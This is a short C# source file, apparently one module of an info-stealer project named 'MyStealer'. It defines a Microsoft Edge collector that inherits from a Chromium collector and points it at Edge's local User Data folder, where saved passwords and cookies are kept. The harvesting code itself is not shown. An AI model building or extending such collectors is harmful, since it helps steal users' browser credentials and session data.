using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    public class MicrosoftEdge : Chromium
    {
        public override string ModuleName => "Microsoft Edge";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data");
    }
}
